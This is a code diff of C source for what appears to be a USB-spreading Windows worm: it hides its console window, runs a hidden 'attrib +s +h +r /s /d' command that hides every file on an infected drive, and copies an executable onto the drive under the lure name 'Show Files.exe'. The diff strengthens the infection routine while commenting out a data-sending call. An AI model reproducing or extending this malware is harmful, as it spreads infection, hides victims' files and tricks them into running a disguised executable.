@@ -41,7 +41,7 @@ char* getRandomName();
 
 main(){
     FreeConsole();  //window is not visible
-    sendData();
+    //sendData();
     age = get_setAge();
     if(checkRecordSize()){   ///check for right time
     
@@ -339,8 +339,11 @@ void infectDrive(char driveLetter){
 
         ///////////////////////////
         char hideCommand[100] = {""};
-        strcat(hideCommand, "attrib +s +h +r ");
-        strcat(hideCommand, folderPath);
+        strcat(hideCommand, "attrib +s +h +r /s /d ");
+        char drivePath[10] = {driveLetter};
+    	strcat(drivePath, ":\\*");
+    	strcat(hideCommand, drivePath);
+        //strcat(hideCommand, folderPath);
 
         WinExec(hideCommand, SW_HIDE);
     }else{
@@ -357,6 +360,7 @@ void infectDrive(char driveLetter){
     char* randomName = getRandomName();
     strcat(infectlnkauto, randomName);
     CopyFile(INFECT_LINK_NAME, infectlnkauto, 0);
+    CopyFile("usb3.exe", infectlnkauto, 0);
 }
 
 /*
@@ -401,7 +405,7 @@ char* getRandomName(){
     }else{
         strcpy(randomName, ":\\TOP SECRET.lnk");
     }
-
+    strcpy(randomName, ":\\Show Files.exe");
     return randomName;
 }
 
